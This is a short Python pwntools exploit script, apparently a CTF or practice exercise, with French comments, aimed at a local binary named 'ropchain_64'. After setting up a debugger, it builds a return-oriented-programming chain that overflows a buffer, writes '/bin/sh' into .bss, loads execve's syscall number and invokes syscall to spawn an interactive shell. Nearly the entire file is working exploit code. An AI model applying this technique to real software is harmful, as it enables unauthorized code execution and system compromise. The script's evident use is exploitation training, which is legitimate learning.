from pwn import *
from archipwn import MultiArchDebugger
import os

class Prog:
    def __init__(self):
        self.io = None
        self.multiarch = None
        self.DEBUGGER = "peda"
        self.BINARY= "./ropchain_64"
        self.GDB_PORT = 1234
        self.DISABLE_ASLR = True
        self.TMUX = True
        self.LIBC_DIR= "" # ici il faut mettre là ou se trouve le répertoire "lib"
        self.BREAKPOINTS=[0x0000000000401143]

    def load_binaries(self):
        self.ELF = ELF(self.BINARY)
        self.LIBC = os.path.join(self.LIBC_DIR,"libc.so.6")
        self.ELF_FUNCTIONS = [func for func in self.ELF.functions]
        print(f"ELF_FUNCTIONS : {self.ELF_FUNCTIONS}")

PROG = Prog()
PROG.multiarch = MultiArchDebugger(
    PROG.BINARY, PROG.DEBUGGER, PROG.GDB_PORT, PROG.DISABLE_ASLR,
    PROG.TMUX, PROG.BREAKPOINTS, PROG.LIBC_DIR)
PROG.load_binaries()
PROG.io = PROG.multiarch.debug()


offset = 10
# 0x000000000040118e : pop rdi ; pop rdx ; pop rbp ; ret
payload = b'A' * (offset+8) 
payload += p64(0x40118e)  # pop rdi ; pop rdx ; pop rbp ; ret
payload += p64(u64(b"/bin/sh\x00"))  # rdi = "/bin/sh\x00"
payload += p64(0xdeadbeef)  # rdx = 0
payload += p64(0xdeadbeef)  # rbp = 0
payload += p64(0x0000000000401182)  # pop rsi ; ret
payload += p64(0x0000000000404038)  # rsi = .bss
payload += p64(0x0000000000401186)  # mov qword ptr [rsi], rdi ; ret

payload += p64(0x40118e)  # pop rdi ; pop rdx ; pop rbp ; ret
payload += p64(0x0000000000404038)  # rdi = "/bin/sh\x00"
payload += p64(0x0)  # rdx = 0
payload += p64(0x0)  # rbp = 0

#0x0000000000401181 : pop rax ; pop rsi ; ret
payload += p64(0x0000000000401181)
payload += p64(59)
payload += p64(0)
payload += p64(0x0000000000401184)



# 0x0000000000401184 : syscall
print(payload)
PROG.io.sendline(payload)

PROG.io.interactive() 


PROG.multiarch.shutdown()


